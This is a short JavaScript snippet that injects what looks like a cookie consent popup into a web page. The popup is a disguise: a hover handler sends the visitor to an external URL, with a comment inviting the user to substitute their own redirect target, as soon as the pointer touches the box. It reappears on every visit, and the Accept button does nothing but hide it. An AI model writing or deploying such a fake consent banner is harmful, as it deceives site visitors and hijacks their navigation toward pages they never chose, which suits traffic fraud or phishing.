<script>
document.addEventListener("DOMContentLoaded", function () {
    let cookiePopup = document.createElement("div");
    cookiePopup.innerHTML = `
        <div id="cookieConsent" style="
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.9);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            z-index: 10000;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);">
            
            <p style="font-size: 16px; margin-bottom: 15px;">
                This website uses cookies to personalize content, provide social media features, and analyze traffic.
                By using our site, you agree to our <a href='/privacy-policy' style='color:#00f;'>Privacy Policy</a>.
            </p>
            <button id="acceptCookies" style="background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px;">Accept</button>
        </div>
    `;
    document.body.appendChild(cookiePopup);

    // Redirect when the user hovers over the popup
    document.getElementById("cookieConsent").addEventListener("mouseenter", function () {
        window.location.href = "https://www.facebook.com"; // Change this to your 301 redirect URL
    });

    // Show the popup every time (even if they accepted before)
    document.getElementById("acceptCookies").addEventListener("click", function () {
        document.getElementById("cookieConsent").remove();
    });
});
</script>
